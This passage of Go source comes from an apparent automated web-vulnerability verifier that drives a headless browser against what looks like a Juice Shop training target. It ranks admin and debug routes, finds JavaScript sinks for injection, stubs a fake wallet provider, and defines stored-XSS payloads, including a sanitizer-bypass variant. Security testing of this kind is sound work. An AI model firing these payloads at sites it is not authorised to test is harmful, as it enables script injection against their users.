				candidate, nil)
			return
		}
	}
}

func browserHTMLInjectionRenderTargets(db *store.DB, scanID int64, target string, limit int) []browserXSSRenderTarget {
	discovered, _ := discovery.DiscoverQueryParamEndpoints(db, scanID)
	seen := make(map[string]bool)
	var out []browserXSSRenderTarget
	add := func(baseURL, param, source string) {
		if len(out) >= limit || strings.TrimSpace(baseURL) == "" || strings.TrimSpace(param) == "" {
			return
		}
		if !browserXSSLooksSearchLike(baseURL, param) {
			return
		}
		key := baseURL + "|" + param
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, browserXSSRenderTarget{baseURL: baseURL, param: param, source: source})
	}
	for _, ep := range discovered {
		base := strings.SplitN(ep.URL, "?", 2)[0]
		for _, p := range ep.Params {
			add(base, p, "observed query/search endpoint")
		}
	}
	return out
}

func (v *VerifierAgent) executeBrowserIframeHTMLInjectionProbe(ctx context.Context, candidateURL, srcNeedle string) bool {
	probeCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	page, err := v.browser.NewPage(probeCtx, "about:blank")
	if err != nil || page == nil {
		return false
	}
	defer page.Close()
	if err := page.Navigate(candidateURL); err != nil {
		return false
	}
	_ = page.Timeout(3 * time.Second).WaitLoad()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if browserIframeWithSrcPresent(page, srcNeedle) {
			return true
		}
		select {
		case <-probeCtx.Done():
			return false
		case <-time.After(250 * time.Millisecond):
		}
	}
	return false
}

func browserIframeWithSrcPresent(page *rod.Page, srcNeedle string) bool {
	if page == nil || strings.TrimSpace(srcNeedle) == "" {
		return false
	}
	needleBytes, _ := json.Marshal(srcNeedle)
	expr := fmt.Sprintf(`() => {
		const needle = %s;
		return Array.from(document.querySelectorAll("iframe"))
			.some(frame => String(frame.getAttribute("src") || frame.src || "").includes(needle));
	}`, string(needleBytes))
	result, err := page.Timeout(1500 * time.Millisecond).Eval(expr)
	if err != nil || result == nil {
		return false
	}
	var ok bool
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &ok); err != nil {
		return strings.EqualFold(result.Value.String(), "true")
	}
	return ok
}

func (v *VerifierAgent) openBrowserNotificationListener(ctx context.Context, target string) (*rod.Page, func()) {
	if v.browser == nil || v.browser.Browser() == nil {
		return nil, func() {}
	}
	pageCtx, cancel := context.WithCancel(ctx)
	page, err := v.browser.NewPage(pageCtx, "about:blank")
	if err != nil || page == nil {
		cancel()
		return nil, func() {}
	}
	rawURL := strings.TrimRight(target, "/") + "/#/score-board"
	if err := page.Navigate(rawURL); err != nil {
		_ = page.Close()
		cancel()
		return nil, func() {}
	}
	_ = page.Timeout(4 * time.Second).WaitLoad()
	return page, func() {
		_ = page.Close()
		cancel()
	}
}

func (v *VerifierAgent) probeBrowserBulkDismissNotifications(ctx context.Context, target string, listener *rod.Page) {
	if v.browser == nil || v.browser.Browser() == nil {
		return
	}
	probeCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	rawURL := strings.TrimRight(target, "/") + "/#/score-board"
	page := listener
	closeWhenDone := false
	if page == nil {
		var err error
		page, err = v.browser.NewPage(probeCtx, "about:blank")
		if err != nil || page == nil {
			return
		}
		closeWhenDone = true
		if err := page.Navigate(rawURL); err != nil {
			_ = page.Close()
			return
		}
		_ = page.Timeout(4 * time.Second).WaitLoad()
	}
	if closeWhenDone {
		defer page.Close()
	}
	count := 0
	deadline := time.Now().Add(6 * time.Second)
	for time.Now().Before(deadline) {
		count = browserChallengeNotificationCount(page)
		if count >= 2 {
			break
		}
		select {
		case <-probeCtx.Done():
			return
		case <-time.After(300 * time.Millisecond):
		}
	}
	if count < 2 {
		v.dismissed++
		return
	}
	v.tested++
	if !browserShiftClickFirstNotificationClose(page) {
		v.dismissed++
		return
	}
	v.confirmed++
	v.db.InsertNarration(v.scanID, "verifier", "confirmed",
		fmt.Sprintf("Bulk-dismissed %d browser notifications with a shift-click close action.", count),
		rawURL, nil)
}

func browserChallengeNotificationCount(page *rod.Page) int {
	if page == nil {
		return 0
	}
	result, err := page.Timeout(1500 * time.Millisecond).Eval(`() => {
		return document.querySelectorAll("app-challenge-solved-notification mat-card #closeButton, .challenge-solved-toast mat-card #closeButton, app-challenge-solved-notification #closeButton, .challenge-solved-toast #closeButton").length;
	}`)
	if err != nil || result == nil {
		return 0
	}
	var count int
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &count); err != nil {
		fmt.Sscanf(result.Value.String(), "%d", &count)
	}
	return count
}

func browserShiftClickFirstNotificationClose(page *rod.Page) bool {
	if page == nil {
		return false
	}
	result, err := page.Timeout(1500 * time.Millisecond).Eval(`() => {
		const btn = document.querySelector(".challenge-solved-toast #closeButton, app-challenge-solved-notification #closeButton");
		if (!btn) return false;
		btn.dispatchEvent(new MouseEvent("click", {bubbles: true, cancelable: true, shiftKey: true}));
		return true;
	}`)
	if err != nil || result == nil {
		return false
	}
	var ok bool
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &ok); err != nil {
		return strings.EqualFold(result.Value.String(), "true")
	}
	return ok
}

func (v *VerifierAgent) probeBrowserInterestingUIRoutes(ctx context.Context, target string) {
	if v.browser == nil || v.browser.Browser() == nil {
		return
	}
	routes := browserInterestingUIRoutes(v.db, v.scanID, target, 4)
	pageCtx, cancel := context.WithTimeout(ctx, 25*time.Second)
	defer cancel()
	page, err := v.browser.NewPage(pageCtx, "about:blank")
	if err != nil || page == nil {
		return
	}
	defer page.Close()
	for _, raw := range routes {
		if ctx.Err() != nil {
			return
		}
		visitURL := browserCanonicalSPARouteURL(target, raw)
		if visitURL == "" {
			continue
		}
		if browserRouteNeedsWeb3ProviderStub(visitURL) {
			_, _ = page.EvalOnNewDocument(minimalWeb3ProviderStubScript())
		}
		err = page.Navigate(visitURL)
		if err == nil {
			wait := 3 * time.Second
			if browserRouteNeedsWeb3ProviderStub(visitURL) {
				wait = 5 * time.Second
			}
			_ = page.Timeout(wait).WaitLoad()
			if browserRouteNeedsWeb3ProviderStub(visitURL) {
				triggerBrowserWeb3RouteConnect(page)
				_ = page.Timeout(2500 * time.Millisecond).WaitLoad()
			}
			v.fetchBrowserRouteEmbeddedStaticAssets(ctx, page, visitURL)
			v.tested++
			v.db.InsertNarration(v.scanID, "verifier", "attempt",
				fmt.Sprintf("Visited JS-discovered interesting UI route %s.", visitURL),
				visitURL, nil)
		}
	}
}

func (v *VerifierAgent) fetchBrowserRouteEmbeddedStaticAssets(ctx context.Context, page *rod.Page, routeURL string) int {
	if v == nil || page == nil || routeURL == "" || ctx.Err() != nil {
		return 0
	}
	resources := browserLoadedInspectableResources(page, routeURL)
	if len(resources) == 0 {
		return 0
	}
	seenBodies := make(map[string]struct{})
	seenAssets := make(map[string]struct{})
	var assets []string
	for i := len(resources) - 1; i >= 0 && len(seenBodies) < 18; i-- {
		resourceURL := resources[i]
		if _, ok := seenBodies[resourceURL]; ok {
			continue
		}
		seenBodies[resourceURL] = struct{}{}
		resp, body, _, err := v.proactiveGETWithHeaders(ctx, resourceURL, map[string]string{
			"Accept":  "*/*",
			"Referer": routeURL,
		}, "AOBTD/Verifier (SPA route asset discovery)")
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 400 || body == "" {
			continue
		}
		for _, assetURL := range browserEmbeddedSameOriginAssetURLs(routeURL, body) {
			if _, ok := seenAssets[assetURL]; ok {
				continue
			}
			seenAssets[assetURL] = struct{}{}
			assets = append(assets, assetURL)
			if len(assets) >= 20 {
				break
			}
		}
	}
	if len(assets) == 0 {
		return 0
	}
	fetched := 0
	for _, assetURL := range assets {
		if ctx.Err() != nil {
			break
		}
		headers := map[string]string{
			"Accept":         browserAcceptHeaderForStaticAsset(assetURL),
			"Referer":        routeURL,
			"Sec-Fetch-Dest": browserFetchDestForStaticAsset(assetURL),
			"Sec-Fetch-Mode": "no-cors",
			"Sec-Fetch-Site": "same-origin",
		}
		resp, _, _, err := v.proactiveGETWithHeaders(ctx, assetURL, headers, "AOBTD/Verifier (SPA route asset discovery)")
		if resp != nil {
			resp.Body.Close()
		}
		if err == nil && resp != nil && resp.StatusCode >= 200 && resp.StatusCode < 400 {
			fetched++
		}
	}
	if fetched > 0 {
		v.tested += fetched
		v.db.InsertNarration(v.scanID, "verifier", "attempt",
			fmt.Sprintf("Fetched %d same-origin static asset(s) embedded in JS/CSS for SPA route %s.", fetched, routeURL),
			routeURL, nil)
	}
	return fetched
}

func triggerBrowserWeb3RouteConnect(page *rod.Page) bool {
	if page == nil {
		return false
	}
	result, err := page.Timeout(1500 * time.Millisecond).Eval(`() => {
		const button = document.querySelector(".metamask-button button, .playground-wallet button, button[mat-raised-button], button");
		if (!button) return false;
		button.dispatchEvent(new MouseEvent("click", {bubbles: true, cancelable: true}));
		return true;
	}`)
	if err != nil || result == nil {
		return false
	}
	var ok bool
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &ok); err != nil {
		return strings.EqualFold(result.Value.String(), "true")
	}
	return ok
}

func browserInterestingUIRoutes(db *store.DB, scanID int64, target string, limit int) []string {
	if db == nil {
		return nil
	}
	rows, err := db.Conn().Query(`
		SELECT target_url, detail
		FROM url_discoveries
		WHERE scan_id = ?
		  AND kind IN ('js-route', 'navigator')
		ORDER BY id ASC
		LIMIT 400`, scanID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	seen := make(map[string]struct{})
	sawWeb3Signal := false
	type routeCandidate struct {
		raw   string
		score int
	}
	var candidates []routeCandidate
	addCandidate := func(raw, detail string) {
		if strings.Contains(strings.ToLower(raw+" "+detail), "web3") {
			sawWeb3Signal = true
		}
		if !strings.Contains(strings.ToLower(detail), "kind=ui") && !strings.Contains(raw, "#/") {
			return
		}
		visitURL := browserCanonicalSPARouteURL(target, raw)
		if visitURL == "" || unsafeSPAUIRoute(visitURL) {
			return
		}
		key := strings.ToLower(visitURL)
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		score := browserInterestingUIRouteScore(visitURL)
		if score <= 0 {
			return
		}
		candidates = append(candidates, routeCandidate{raw: visitURL, score: score})
	}
	for rows.Next() {
		var raw, detail string
		if err := rows.Scan(&raw, &detail); err != nil {
			continue
		}
		addCandidate(raw, detail)
	}
	if sawWeb3Signal {
		origin := strings.TrimRight(originFromURL(target), "/")
		if origin != "" {
			addCandidate(origin+"/web3-sandbox", "GET kind=ui discovered web3 fallback")
			addCandidate(origin+"/wallet-web3", "GET kind=ui discovered web3 fallback")
		}
	}
	sort.SliceStable(candidates, func(i, j int) bool {
		return candidates[i].score > candidates[j].score
	})
	if limit <= 0 || limit > len(candidates) {
		limit = len(candidates)
	}
	out := make([]string, 0, limit)
	for _, c := range candidates[:limit] {
		out = append(out, c.raw)
	}
	return out
}

func browserInterestingUIRouteScore(raw string) int {
	lower := strings.ToLower(raw)
	score := 0
	if strings.Contains(lower, "web3-sandbox") {
		score += 220
	}
	for _, group := range []struct {
		points int
		terms  []string
	}{
		{100, []string{"sandbox", "web3-sandbox", "debug", "console", "playground"}},
		{80, []string{"admin", "administration", "moderation", "support", "accounting"}},
		{60, []string{"privacy-security", "data-export", "two-factor", "2fa"}},
		{40, []string{"wallet-web3", "juicy-nft", "bee-haven", "hacking-instructor"}},
	} {
		for _, term := range group.terms {
			if strings.Contains(lower, term) {
				score += group.points
				break
			}
		}
	}
	return score
}

func browserRouteNeedsWeb3ProviderStub(raw string) bool {
	lower := strings.ToLower(raw)
	return strings.Contains(lower, "web3") ||
		strings.Contains(lower, "wallet") ||
		strings.Contains(lower, "nft")
}

func browserLoadedInspectableResources(page *rod.Page, routeURL string) []string {
	if page == nil || routeURL == "" {
		return nil
	}
	result, err := page.Timeout(1500 * time.Millisecond).Eval(`() => {
		const entries = performance.getEntriesByType("resource").map((entry) => entry.name);
		const scripts = Array.from(document.scripts || []).map((script) => script.src);
		const links = Array.from(document.querySelectorAll("link[href]")).map((link) => link.href);
		return Array.from(new Set(entries.concat(scripts, links).filter(Boolean))).slice(-120);
	}`)
	if err != nil || result == nil {
		return nil
	}
	var raw []string
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &raw); err != nil {
		return nil
	}
	out := make([]string, 0, len(raw))
	seen := make(map[string]struct{})
	for _, candidate := range raw {
		if !browserInspectableResourceURL(routeURL, candidate) {
			continue
		}
		if _, ok := seen[candidate]; ok {
			continue
		}
		seen[candidate] = struct{}{}
		out = append(out, candidate)
	}
	return out
}

func browserInspectableResourceURL(routeURL, candidate string) bool {
	if routeURL == "" || candidate == "" {
		return false
	}
	if originFromURL(candidate) == "" || originFromURL(candidate) != originFromURL(routeURL) {
		return false
	}
	parsed, err := url.Parse(candidate)
	if err != nil {
		return false
	}
	lowerPath := strings.ToLower(parsed.Path)
	return strings.HasSuffix(lowerPath, ".js") ||
		strings.HasSuffix(lowerPath, ".mjs") ||
		strings.HasSuffix(lowerPath, ".css")
}

var browserEmbeddedStaticAssetRe = regexp.MustCompile(`(?i)(?:^|["'(=:\s])(/?assets/[A-Za-z0-9._~!$&*+,;=:@/%?#-]+\.(?:png|jpe?g|gif|svg|webp|avif|ico|json|txt|css|js|mjs|woff2?|ttf))`)

func browserEmbeddedSameOriginAssetURLs(routeURL, body string) []string {
	if routeURL == "" || body == "" {
		return nil
	}
	matches := browserEmbeddedStaticAssetRe.FindAllStringSubmatch(body, 80)
	if len(matches) == 0 {
		return nil
	}
	seen := make(map[string]struct{})
	out := make([]string, 0, len(matches))
	for _, match := range matches {
		if len(match) < 2 {
			continue
		}
		resolved := browserResolveSameOriginStaticAssetURL(routeURL, match[1])
		if resolved == "" {
			continue
		}
		if _, ok := seen[resolved]; ok {
			continue
		}
		seen[resolved] = struct{}{}
		out = append(out, resolved)
	}
	return out
}

func browserResolveSameOriginStaticAssetURL(routeURL, raw string) string {
	raw = strings.TrimSpace(raw)
	raw = strings.Trim(raw, `"'()`)
	if routeURL == "" || raw == "" {
		return ""
	}
	base, err := url.Parse(routeURL)
	if err != nil || base.Scheme == "" || base.Host == "" {
		return ""
	}
	ref, err := url.Parse(raw)
	if err != nil {
		return ""
	}
	if ref.Scheme == "" && strings.HasPrefix(strings.ToLower(raw), "assets/") {
		ref.Path = "/" + strings.TrimLeft(ref.Path, "/")
	}
	resolved := base.ResolveReference(ref)
	resolved.Fragment = ""
	if resolved.Scheme == "" || resolved.Host == "" || originFromURL(resolved.String()) != originFromURL(routeURL) {
		return ""
	}
	if !browserStaticAssetPathCandidate(resolved.Path) {
		return ""
	}
	return resolved.String()
}

func browserStaticAssetPathCandidate(path string) bool {
	lower := strings.ToLower(path)
	if !strings.Contains(lower, "/assets/") {
		return false
	}
	for _, suffix := range []string{".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp", ".avif", ".ico", ".json", ".txt", ".css", ".js", ".mjs", ".woff", ".woff2", ".ttf"} {
		if strings.HasSuffix(lower, suffix) {
			return true
		}
	}
	return false
}

func browserAcceptHeaderForStaticAsset(rawURL string) string {
	lower := strings.ToLower(rawURL)
	switch {
	case strings.HasSuffix(lower, ".png"), strings.HasSuffix(lower, ".jpg"), strings.HasSuffix(lower, ".jpeg"),
		strings.HasSuffix(lower, ".gif"), strings.HasSuffix(lower, ".svg"), strings.HasSuffix(lower, ".webp"),
		strings.HasSuffix(lower, ".avif"), strings.HasSuffix(lower, ".ico"):
		return "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8"
	case strings.HasSuffix(lower, ".css"):
		return "text/css,*/*;q=0.1"
	case strings.HasSuffix(lower, ".js"), strings.HasSuffix(lower, ".mjs"):
		return "*/*"
	default:
		return "*/*"
	}
}

func browserFetchDestForStaticAsset(rawURL string) string {
	lower := strings.ToLower(rawURL)
	switch {
	case strings.HasSuffix(lower, ".png"), strings.HasSuffix(lower, ".jpg"), strings.HasSuffix(lower, ".jpeg"),
		strings.HasSuffix(lower, ".gif"), strings.HasSuffix(lower, ".svg"), strings.HasSuffix(lower, ".webp"),
		strings.HasSuffix(lower, ".avif"), strings.HasSuffix(lower, ".ico"):
		return "image"
	case strings.HasSuffix(lower, ".css"):
		return "style"
	case strings.HasSuffix(lower, ".js"), strings.HasSuffix(lower, ".mjs"):
		return "script"
	default:
		return "empty"
	}
}

func minimalWeb3ProviderStubScript() string {
	return `(() => {
		if (window.ethereum) return;
		const accounts = ["0x000000000000000000000000000000000000beef"];
		let chainId = "0xaa36a7";
		const listeners = {};
		const notify = (event, payload) => {
			const cbs = listeners[event] || [];
			for (const cb of cbs) {
				try { cb(payload); } catch (_) {}
			}
		};
		const provider = {
			isMetaMask: true,
			isConnected: () => true,
			selectedAddress: accounts[0],
			chainId,
			networkVersion: "11155111",
			on: (event, cb) => {
				if (!listeners[event]) listeners[event] = [];
				listeners[event].push(cb);
				return provider;
			},
			removeListener: (event, cb) => {
				if (!listeners[event]) return provider;
				if (!cb) {
					delete listeners[event];
					return provider;
				}
				listeners[event] = listeners[event].filter((item) => item !== cb);
				return provider;
			},
			off: (event, cb) => provider.removeListener(event, cb),
			enable: async () => accounts,
			request: async ({method, params} = {}) => {
				switch (method) {
				case "eth_requestAccounts":
				case "eth_accounts":
					return accounts;
				case "eth_coinbase":
					return accounts[0];
				case "eth_chainId":
					return chainId;
				case "net_version":
					return "11155111";
				case "wallet_addEthereumChain":
				case "wallet_switchEthereumChain":
					if (params && params[0] && params[0].chainId) {
						chainId = params[0].chainId;
						provider.chainId = chainId;
						notify("chainChanged", chainId);
					}
					return null;
				case "eth_getBalance":
					return "0x0";
				case "eth_blockNumber":
					return "0x1";
				case "personal_sign":
				case "eth_sign":
				case "eth_signTypedData":
				case "eth_signTypedData_v4":
					return "0x" + "0".repeat(130);
				case "eth_sendTransaction":
					return "0x" + "1".repeat(64);
				case "eth_getTransactionReceipt":
					return null;
				default:
					return null;
				}
			},
			send: (methodOrPayload, paramsOrCallback) => {
				if (typeof methodOrPayload === "string") {
					return provider.request({method: methodOrPayload, params: Array.isArray(paramsOrCallback) ? paramsOrCallback : []});
				}
				const payload = methodOrPayload || {};
				const cb = typeof paramsOrCallback === "function" ? paramsOrCallback : null;
				const promise = provider.request({method: payload.method, params: payload.params});
				if (cb) {
					promise.then((result) => cb(null, {id: payload.id, jsonrpc: payload.jsonrpc || "2.0", result})).catch(cb);
					return;
				}
				return promise;
			},
			sendAsync: (payload, cb) => {
				provider.request({method: payload && payload.method, params: payload && payload.params})
					.then((result) => cb && cb(null, {id: payload.id, jsonrpc: payload.jsonrpc || "2.0", result}))
					.catch((err) => cb && cb(err));
			}
		};
		window.ethereum = provider;
		window.web3 = window.web3 || { currentProvider: provider };
		setTimeout(() => {
			notify("connect", { chainId });
			notify("accountsChanged", accounts);
			notify("chainChanged", chainId);
		}, 0);
	})()`
}

func browserCanonicalSPARouteURL(target, raw string) string {
	target = strings.TrimRight(target, "/")
	if target == "" || raw == "" {
		return ""
	}
	base, err := url.Parse(target)
	if err != nil || base.Scheme == "" || base.Host == "" {
		return ""
	}
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil {
		return ""
	}
	if !u.IsAbs() {
		u = base.ResolveReference(u)
	}
	if !strings.EqualFold(u.Host, base.Host) {
		return ""
	}
	if navigatorFragmentIsRoute(u.Fragment) {
		out := *base
		out.Path = firstNonBlank(base.Path, "/")
		out.RawQuery = ""
		out.Fragment = u.Fragment
		return out.String()
	}
	path := u.EscapedPath()
	if path == "" || path == "/" || navigatorPlainRouteShouldStayServerPath(path) {
		return ""
	}
	route := path
	if u.RawQuery != "" {
		route += "?" + u.RawQuery
	}
	out := *base
	out.Path = firstNonBlank(base.Path, "/")
	out.RawQuery = ""
	out.Fragment = route
	return out.String()
}

func (v *VerifierAgent) discoverJSBrowserXSSRenderTargets(ctx context.Context, target string) []browserXSSRenderTarget {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return nil
	}
	targets := browserXSSRenderTargetsFromTraffic(entries, target)
	seen := make(map[string]bool)
	for _, target := range targets {
		seen[target.baseURL+"|"+target.param] = true
	}
	if len(targets) >= 30 {
		return targets
	}

	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return targets
	}

	fetched := 0
	for _, entry := range prioritizedJSRefetchCandidates(entries) {
		if ctx.Err() != nil || len(targets) >= 30 || fetched >= 16 {
			return targets
		}
		resp, body, _, err := v.proactiveGET(ctx, entry.Request.URL)
		if err != nil || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 || len(body) == 0 || len(body) > 4*1024*1024 {
			continue
		}
		fetched++
		for _, target := range browserXSSRenderTargetsFromJS(body, origin) {
			key := target.baseURL + "|" + target.param
			if seen[key] {
				continue
			}
			seen[key] = true
			targets = append(targets, target)
			if len(targets) >= 30 {
				return targets
			}
		}
	}
	return targets
}

func prioritizedJSRefetchCandidates(entries []types.TrafficEntry) []types.TrafficEntry {
	type candidate struct {
		entry    types.TrafficEntry
		priority int
		size     int64
		index    int
	}
	var candidates []candidate
	for i, entry := range entries {
		if !trafficEntryLooksJavaScript(entry) || len(entry.Response.Body) > 0 {
			continue
		}
		if entry.Response.StatusCode != http.StatusOK || entry.Response.Size <= 0 || entry.Response.Size > 4*1024*1024 {
			continue
		}
		candidates = append(candidates, candidate{
			entry:    entry,
			priority: jsRefetchPriority(entry),
			size:     entry.Response.Size,
			index:    i,
		})
	}
	sort.SliceStable(candidates, func(i, j int) bool {
		if candidates[i].priority != candidates[j].priority {
			return candidates[i].priority > candidates[j].priority
		}
		if candidates[i].size != candidates[j].size {
			return candidates[i].size > candidates[j].size
		}
		return candidates[i].index < candidates[j].index
	})
	out := make([]types.TrafficEntry, 0, len(candidates))
	for _, c := range candidates {
		out = append(out, c.entry)
	}
	return out
}

func jsRefetchPriority(entry types.TrafficEntry) int {
	raw := strings.ToLower(strings.SplitN(entry.Request.URL, "?", 2)[0])
	path := raw
	if parsed, err := url.Parse(entry.Request.URL); err == nil && parsed.Path != "" {
		path = strings.ToLower(parsed.Path)
	}
	parts := strings.Split(strings.Trim(path, "/"), "/")
	name := path
	if len(parts) > 0 {
		name = parts[len(parts)-1]
	}

	score := 0
	if strings.Contains(strings.ToLower(entry.Response.ContentType), "javascript") {
		score += 5
	}
	switch {
	case name == "main.js" || strings.HasPrefix(name, "main.") || strings.Contains(name, "main-"):
		score += 120
	case strings.Contains(name, "app"):
		score += 90
	case strings.Contains(name, "chunk"):
		score += 40
	}
	if entry.Response.Size >= 512*1024 {
		score += 25
	} else if entry.Response.Size >= 96*1024 {
		score += 15
	} else if entry.Response.Size >= 32*1024 {
		score += 8
	}
	for _, lowSignal := range []string{"polyfill", "runtime", "vendor", "scripts"} {
		if strings.Contains(name, lowSignal) {
			score -= 50
		}
	}
	return score
}

func browserXSSRenderTargetsFromTraffic(entries []types.TrafficEntry, target string) []browserXSSRenderTarget {
	origin := originFromURL(target)
	if origin == "" {
		for _, entry := range entries {
			origin = originFromURL(entry.Request.URL)
			if origin != "" {
				break
			}
		}
	}
	if origin == "" {
		return nil
	}

	seen := make(map[string]bool)
	var out []browserXSSRenderTarget
	for _, entry := range entries {
		if !trafficEntryLooksJavaScript(entry) {
			continue
		}
		body := string(entry.Response.Body)
		if len(body) == 0 || len(body) > 4*1024*1024 {
			continue
		}
		for _, target := range browserXSSRenderTargetsFromJS(body, origin) {
			key := target.baseURL + "|" + target.param
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, target)
			if len(out) >= 30 {
				return out
			}
		}
	}
	return out
}

func trafficEntryLooksJavaScript(entry types.TrafficEntry) bool {
	lowerURL := strings.ToLower(entry.Request.URL)
	lowerCT := strings.ToLower(entry.Response.ContentType)
	if strings.Contains(lowerCT, "javascript") || strings.Contains(lowerCT, "ecmascript") {
		return true
	}
	if strings.HasSuffix(strings.SplitN(lowerURL, "?", 2)[0], ".js") {
		return true
	}
	return false
}

func browserXSSRenderTargetsFromJS(js, origin string) []browserXSSRenderTarget {
	routeMap := angularRouteComponentMap(js)
	matches := jsQueryParamRegex().FindAllStringSubmatchIndex(js, 200)
	seen := make(map[string]bool)
	var out []browserXSSRenderTarget

	for _, match := range matches {
		param := queryParamFromSubmatch(js, match)
		if param == "" {
			continue
		}
		start := match[0]
		window := jsWindow(js, start, 5000, 9000)
		if !jsWindowHasUnsafeHTMLSink(window) {
			continue
		}

		component := nearestAngularComponentVar(js, start)
		paths := preferredJSRenderRoutes(routeMap[component])
		if len(paths) == 0 {
			paths = append(paths, routeGuessesFromSelector(window)...)
		}
		if len(paths) == 0 {
			continue
		}

		for _, path := range paths {
			base, ok := hashRouteBaseURL(origin, path)
			if !ok {
				continue
			}
			key := base + "|" + param
			if seen[key] {
				continue
			}
			seen[key] = true
			source := "javascript route sink"
			if component != "" {
				source = fmt.Sprintf("javascript route sink in component %s", component)
			}
			out = append(out, browserXSSRenderTarget{baseURL: base, param: param, source: source})
			if len(out) >= 20 {
				return out
			}
		}
	}
	return out
}

func preferredJSRenderRoutes(paths []string) []string {
	if len(paths) <= 1 {
		return paths
	}
	best := ""
	bestSegments := 0
	for _, path := range paths {
		path = strings.Trim(path, "/")
		if path == "" || strings.Contains(path, ":") || strings.Contains(path, "*") {
			continue
		}
		segments := len(strings.Split(path, "/"))
		if best == "" || segments < bestSegments || (segments == bestSegments && len(path) < len(best)) {
			best = path
			bestSegments = segments
		}
	}
	if best == "" {
		return nil
	}
	return []string{best}
}

func angularRouteComponentMap(js string) map[string][]string {
	out := make(map[string][]string)
	re := regexp.MustCompile(`path:"([^"]+)",component:([A-Za-z_$][A-Za-z0-9_$]*)`)
	for _, match := range re.FindAllStringSubmatch(js, 500) {
		if len(match) < 3 {
			continue
		}
		path := strings.TrimSpace(match[1])
		component := strings.TrimSpace(match[2])
		if path == "" || component == "" {
			continue
		}
		out[component] = append(out[component], path)
	}
	return out
}

func jsQueryParamRegex() *regexp.Regexp {
	return regexp.MustCompile(`queryParams\.([A-Za-z_$][A-Za-z0-9_$]*)|queryParamMap\.get\(["']([^"']+)["']\)`)
}

func queryParamFromSubmatch(js string, match []int) string {
	if len(match) >= 4 && match[2] >= 0 && match[3] >= 0 {
		return js[match[2]:match[3]]
	}
	if len(match) >= 6 && match[4] >= 0 && match[5] >= 0 {
		return js[match[4]:match[5]]
	}
	return ""
}

func jsWindow(js string, idx, before, after int) string {
	start := idx - before
	if start < 0 {
		start = 0
	}
	end := idx + after
	if end > len(js) {
		end = len(js)
	}
	return js[start:end]
}

func jsWindowHasUnsafeHTMLSink(window string) bool {
	lower := strings.ToLower(window)
	for _, needle := range []string{
		"bypasssecuritytrusthtml",
		"innerhtml",
		"document.write",
		"dangerouslysetinnerhtml",
		"insertadjacenthtml",
	} {
		if strings.Contains(lower, needle) {
			return true
		}
	}
	return false
}

func nearestAngularComponentVar(js string, idx int) string {
	start := idx - 12000
	if start < 0 {
		start = 0
	}
	prefix := js[start:idx]
	re := regexp.MustCompile(`var\s+([A-Za-z_$][A-Za-z0-9_$]*)=\(\(\)=>\{class`)
	matches := re.FindAllStringSubmatch(prefix, -1)
	if len(matches) == 0 {
		return ""
	}
	return matches[len(matches)-1][1]
}

func routeGuessesFromSelector(window string) []string {
	re := regexp.MustCompile(`selectors:\[\["app-([^"]+)"\]\]`)
	seen := make(map[string]bool)
	var out []string
	for _, match := range re.FindAllStringSubmatch(window, 10) {
		if len(match) < 2 {
			continue
		}
		path := strings.Trim(match[1], "/")
		if path == "" || seen[path] {
			continue
		}
		seen[path] = true
		out = append(out, path)
	}
	return out
}

func hashRouteBaseURL(origin, path string) (string, bool) {
	path = strings.TrimSpace(path)
	if path == "" || path == "**" || strings.Contains(path, ":") ||
		strings.Contains(path, "*") || strings.Contains(path, "(") {
		return "", false
	}
	origin = strings.TrimRight(origin, "/")
	path = strings.Trim(path, "/")
	if path == "" {
		return origin + "/#/", true
	}
	return origin + "/#/" + path, true
}

const commonStoredXSSPayload = "<iframe src=\"javascript:alert(`xss`)\">"

type storedXSSPayload struct {
	Payload       string
	Expected      string
	ExpectedAlert string
	Marker        string
	Kind          string
}

type storedXSSWriteCandidate struct {
	URL             string
	Path            string
	Method          string
	Body            map[string]any
	InjectFields    []string
	RenderURLs      []string
	RequiresCaptcha bool
	PreferAuth      bool
	Source          string
}

type storedXSSWriteResult struct {
	Status     int
	Body       string
	AuthSource string
}

func storedXSSPayloads(marker string) []storedXSSPayload {
	quotedMarker, _ := json.Marshal(marker)
	return []storedXSSPayload{
		{
			Payload:       commonStoredXSSPayload,
			Expected:      commonStoredXSSPayload,
			ExpectedAlert: "xss",
			Kind:          "iframe-javascript-alert-common",
		},
		{
			// Sanitizer-differential probe: old single-pass HTML sanitizers can
			// strip the inner <script> and accidentally stitch the remaining text
			// back into an executable tag. This is a class of bypass, not an
			// application-specific string.
			Payload:       "AOBTD sanitizer differential: <<script>removed</script>iframe src=\"javascript:alert(`xss`)\">",
			Expected:      commonStoredXSSPayload,
			ExpectedAlert: "xss",
			Kind:          "nested-tag-sanitizer-differential",
		},
		{
			Payload:  fmt.Sprintf(`"><img src=x onerror='window.__AOBTD_XSS_PROOF__=%s'>`, quotedMarker),
			Expected: marker,
			Marker:   marker,
			Kind:     "img-onerror-marker",
		},
		{
			Payload:       fmt.Sprintf(`<iframe src='javascript:alert(%s)'></iframe>`, quotedMarker),
			Expected:      marker,
			ExpectedAlert: marker,
			Marker:        marker,
			Kind:          "iframe-javascript-alert-marker",
		},
	}
}

func (v *VerifierAgent) probeStoredXSSWriteThenRender(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	candidates := storedXSSWriteCandidatesFromTraffic(entries, target)
	if len(candidates) == 0 {
		return
	}

